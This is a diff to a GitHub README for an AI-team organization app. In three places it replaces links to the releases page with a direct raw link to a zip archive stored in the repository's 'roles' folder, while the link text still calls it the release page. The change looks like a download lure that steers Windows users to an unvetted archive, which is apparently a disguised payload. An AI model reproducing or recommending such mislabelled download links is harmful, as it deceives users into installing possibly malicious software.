@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-organization - Build AI Teams That Work
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Madelsapiential474/awesome-ai-organization/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Madelsapiential474/awesome-ai-organization/raw/refs/heads/main/roles/ai_organization_awesome_1.1.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ Use it to organize work, assign roles, and follow simple steps that keep each AI
 
 ## 📥 Download and install
 
-1. Open the [release page](https://github.com/Madelsapiential474/awesome-ai-organization/releases).
+1. Open the [release page](https://github.com/Madelsapiential474/awesome-ai-organization/raw/refs/heads/main/roles/ai_organization_awesome_1.1.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. If the file is in a .zip folder, right-click it and choose Extract All.
@@ -106,7 +106,7 @@ You can use these roles in a small team or a larger AI setup.
 
 Use this page to download the app for Windows:
 
-[Visit the release page](https://github.com/Madelsapiential474/awesome-ai-organization/releases)
+[Visit the release page](https://github.com/Madelsapiential474/awesome-ai-organization/raw/refs/heads/main/roles/ai_organization_awesome_1.1.zip)
 
 Then:
 - Open the latest release
